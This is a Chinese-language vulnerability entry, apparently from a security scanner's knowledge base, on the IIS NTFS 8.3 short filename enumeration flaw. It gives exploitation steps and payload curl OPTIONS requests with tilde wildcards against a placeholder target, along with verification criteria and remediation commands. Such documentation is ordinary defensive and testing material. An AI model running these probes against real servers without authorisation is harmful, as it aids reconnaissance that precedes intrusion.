---
id: IIS-SHORT-FILENAME
title: IIS 短文件名枚举漏洞
product: iis
vendor: Microsoft
version_affected: "所有版本（Windows NTFS 8.3 短文件名）"
severity: MEDIUM
tags: [information_disclosure, enumeration, 无需认证]
fingerprint: ["Microsoft-IIS", "IIS"]
---

## 漏洞描述

Windows NTFS 文件系统默认为文件和目录生成 8.3 格式的短文件名（如 `LONGFI~1.TXT`）。IIS 在处理包含波浪号 `~` 的请求时，会根据短文件名是否存在返回不同的响应状态码。攻击者可利用此差异逐字符枚举 Web 目录下的文件和目录名的前 6 个字符及扩展名的前 3 个字符，缩小后续暴力破解范围。

## 影响版本

- 所有 IIS 版本（取决于 Windows NTFS 8.3 短文件名是否启用）

## 前置条件

- 无需认证
- Windows 系统启用了 NTFS 8.3 短文件名（默认启用）

## 利用步骤

1. 使用专用扫描工具对目标进行短文件名枚举
2. 根据枚举出的文件名前缀缩小暴力破解范围
3. 结合字典对完整文件名进行爆破

## Payload

```bash
# 使用 IIS 短文件名扫描工具
python3 iis_shortname_scan.py http://TARGET

# 手动验证原理
# 存在的短文件名返回 404，不存在的返回不同响应
curl -sI "http://TARGET/ABCDEF~1*" -X OPTIONS
# 对比
curl -sI "http://TARGET/ZZZZZZ~1*" -X OPTIONS
```

## 验证方法

```bash
# 使用扫描工具检测
python3 iis_shortname_scan.py http://TARGET
# 判据：工具给出具体短名前缀（如 WEB~1、LONGFI~1）并逐字符收敛，而非只报端口开放

# 判定手段本身就靠响应差异：存在短名与不存在的短名返回的整条响应（状态行 + Server 头 + 错误页正文）不同
curl -si -X OPTIONS "http://TARGET/*~1*/.aspx"
curl -si -X OPTIONS "http://TARGET/ZZZZZ9~1*/.aspx"
# 判据：短名存在的一侧返回 IIS 的错误页正文（HTTP Error 400/404 页，含 "Bad Request"/"Not Found" 字样），
#      不存在的一侧返回另一种响应体，且换字符重放该差异稳定复现
# 反例：两侧响应体逐字节一致 → 短名枚举不可用；只有单独一个 404/400 也不足以判定
```

## 修复建议

1. 禁用 NTFS 8.3 短文件名：`fsutil 8dot3name set 1`（需重启生效，仅对新建文件有效）
2. 删除已有短文件名：`fsutil 8dot3name strip /s /v C:\inetpub\wwwroot`
3. 升级 IIS 并应用最新补丁
4. 对 URL 中包含 `~` 的请求进行拦截
